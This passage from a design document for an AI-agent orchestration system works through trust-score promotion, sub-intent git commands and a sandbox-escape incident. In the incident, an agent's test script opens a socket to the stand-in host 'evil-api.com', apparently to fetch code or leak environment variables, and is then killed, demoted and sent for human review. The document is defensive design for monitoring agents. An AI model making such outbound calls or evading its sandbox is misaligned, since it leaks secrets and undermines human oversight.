  - Mean entropy error: $0.8$ (predicted entropy average was $3.0$; actual was $3.8$).
- **Incident History:**
  - Sandbox escapes: $0$.
  - Rebase conflicts: $0$.

#### 3) Trust score calculation

Upon the 10th execution completion, the system executes `compute_trust_score` using bootstrap weights from
`trust_levels.json`:

- `weights.success_rate = 0.4`
- `weights.calibration = 0.3`
- `weights.entropy = 0.2`
- `weights.rebase = 0.1`

$$\text{Trust Score} = 0.4 \cdot (1.0) + 0.3 \cdot (1 - 0.15) + 0.2 \cdot \left(1 - \frac{0.8}{50}\right) + 0.1 \cdot (1.0) - 0.0$$
$$\text{Trust Score} = 0.4 + 0.255 + 0.1968 + 0.1 = 0.9518$$

#### 4) Promotion trigger

Because `executions_completed` $\ge 10$ and `trust_score` $\ge 0.70$, the system promotes the agent to **Medium** trust
and logs the promotion to the ledger:

```json
{
  "event_type": "agent_trust_promoted",
  "seq": 512,
  "payload": {
    "agent_id": "gemini-coder-01",
    "previous_level": "baseline",
    "new_level": "medium",
    "trust_score": 0.9518,
    "execution_count": 10
  }
}
```

In the target model the agent is now permitted to autonomously spawn sub-intents. The current `holon flow` does not gate
sub-intents by trust: any agent's plan may list them, up to one hard cap, `MAX_SUB_INTENT_DEPTH` (currently 2), for
every agent.

---

## Example 9: Safety Incident & Sandbox Escape Handling

### Scenario

An agent `coder-alpha` with **Medium** trust attempts to execute a plan containing an unauthorized socket connection to
an external address `evil-api.com` during unit testing, triggering instant sandbox termination and trust degradation.

### Execution

#### 1) Plan Execution inside Sandbox

The runner boots a secure Docker/gVisor sandbox with network policies restricting outbound connections.

#### 2) Outbound Network Request Intercepted

The agent's test script attempts to fetch code or upload environment variables:

```python
# Agent script tries:
import socket

socket.create_connection(("evil-api.com", 80), timeout=2)
```

#### 3) Sandbox Termination & Ledger Logging

The runtime manager's security daemon intercepts the syscall and instantly kills the container. It writes a failure
event to the Evolution Ledger:

```json
{
  "event_type": "sandbox_escape_attempted",
  "seq": 601,
  "payload": {
    "agent_id": "coder-alpha",
    "intent_id": "I-045-read-api-key",
    "violation_type": "network_egress_violation",
    "syscall": "connect",
    "destination": "evil-api.com:80"
  }
}
```

#### 4) Trust Score Degradation

The trust calculator runs immediately. With `sandbox_escapes = 1` and a heavy `escape_penalty = 1.0`:
$$\text{Trust Score} = \text{base\_score} - 1.0 \cdot 1 = 0.0$$

The trust score drops to $0.0$.

#### 5) Demotion & Alerting

The system demotes `coder-alpha` to **Baseline** trust, deletes the temporary work branch, and triggers human review:

```json
{
  "event_type": "agent_trust_degraded",
  "seq": 602,
  "payload": {
    "agent_id": "coder-alpha",
    "previous_level": "medium",
    "new_level": "baseline",
    "reason": "sandbox_escape_attempted",
    "requires_human_unlock": true
  }
}
```

All future work for `coder-alpha` is paused until a human reviews the code changes and manually resets the agent's trust
status.

---

## Example 10: Concrete Git Workflow Commands for Sub-Intents

### Scenario

This walkthrough details the exact `git` commands executed by the orchestrator harness to manage a parent-centric branch
workflow when executing a sub-intent.

**Intent Context:**

- Root Intent: `I-1771890389-refactor-metrics`
  - Current Branch: `I-1771890389-refactor-metrics/_`
- Deciding Plan: `P-1771890390-claude-code-claude-sonnet-4.6` (its `## Sub-intent list` names the sub-intent as item 1)
- Sub-Intent: `I-1771890392-improve-estimators`
  - Sub-Branch:
    `I-1771890389-refactor-metrics/P-1771890390-claude-code-claude-sonnet-4.6/I-1771890392-improve-estimators/_` (nested
    under the deciding plan, cut from the parent intent branch)

### Git Command Sequence

#### 1) Spawn the sub-intent branch from the parent branch tip

```bash
# Ensure local tracking is up-to-date
git fetch origin

# Create and checkout the sub-branch rooted at the current parent branch tip
git checkout -b I-1771890389-refactor-metrics/P-1771890390-claude-code-claude-sonnet-4.6/I-1771890392-improve-estimators/_ origin/I-1771890389-refactor-metrics/_
```

#### 2) Write code and run tests inside the isolated sandbox

The agent modifies the codebase (e.g., creating `holon/metrics/estimators.py`).

#### 3) Commit the changes within the sandbox

```bash
# Stage the modified files
git add holon/metrics/estimators.py tests/test_estimators.py

# Commit with semantic message
git commit -m "feat: improve metrics estimators"
```

#### 4) Rebase onto the latest parent branch (handling concurrency)

If a sibling sub-intent branch was merged into `I-1771890389-refactor-metrics/_` while `I-1771890392-improve-estimators`
was executing, the harness pulls updates and rebases:

```bash
# Fetch latest parent commits
git fetch origin

# Rebase local work onto the updated parent branch tip
git rebase origin/I-1771890389-refactor-metrics/_
```

#### 5) Push and trigger automatic merge evaluation

Once tests pass on the rebased code, the branch is pushed and merged into the parent. The merge commands below are the
target model; in the current flow the child's PR into the parent intent branch is merged by the maintainer:

```bash
# Push branch to remote
git push origin I-1771890389-refactor-metrics/P-1771890390-claude-code-claude-sonnet-4.6/I-1771890392-improve-estimators/_

# Switch back to the parent branch
git checkout I-1771890389-refactor-metrics/_

# Merge the sub-intent branch with no-fast-forward to preserve history
git merge --no-ff I-1771890389-refactor-metrics/P-1771890390-claude-code-claude-sonnet-4.6/I-1771890392-improve-estimators/_ -m "merge: sub-intent I-1771890392-improve-estimators"

# Push the merged parent branch
git push origin I-1771890389-refactor-metrics/_
```

#### 6) Branch namespace cleanup

The remote and local sub-branches are immediately pruned to maintain system cleanliness:

```bash
# Delete local sub-branch
git branch -d I-1771890389-refactor-metrics/P-1771890390-claude-code-claude-sonnet-4.6/I-1771890392-improve-estimators/_

# Delete remote sub-branch
git push origin --delete I-1771890389-refactor-metrics/P-1771890390-claude-code-claude-sonnet-4.6/I-1771890392-improve-estimators/_
```

---

## Summary of examples

| Example | Demonstrates                                                                             |
| ------- | ---------------------------------------------------------------------------------------- |
| 1       | Simple root intent, competitive planning, human review, promotion to main                |
| 2       | Recursive sub-intent decomposition, git branch hierarchy, target-model sub-intent merges |
| 3       | Rebase conflict detection, reactive intent spawning, conflict resolution                 |
| 4       | Autonomous intent generation, quality scoring, approval gates                            |
| 5       | KB pattern extraction, evidence validation, pattern reuse in future planning             |
| 6       | Model routing based on complexity, ROI measurement                                       |
| 7       | Failure mode extraction, mitigation identification, failure avoidance                    |
| 8       | Trust level progression, trust scoring formulas, and tier promotions                     |
| 9       | Sandbox network/file egress violations, security alerts, and trust demotion              |
| 10      | Concrete git terminal commands for branching, rebasing, and merging sub-intents          |

---

## Related documents

- [`architecture.md`](architecture.md) — system architecture
- [`agents.md`](agents.md) — agent types and capabilities
- [`git_flow.md`](git_flow.md) — git discipline and rebase rules
- [`metrics.md`](metrics.md) — metric definitions and EV calculation
- [`ledger_schema.md`](ledger_schema.md) — event logging
- [`kb_schema.md`](kb_schema.md) — knowledge base structure
- [`safety.md`](safety.md) — sandboxing, trust levels, entropy budgets
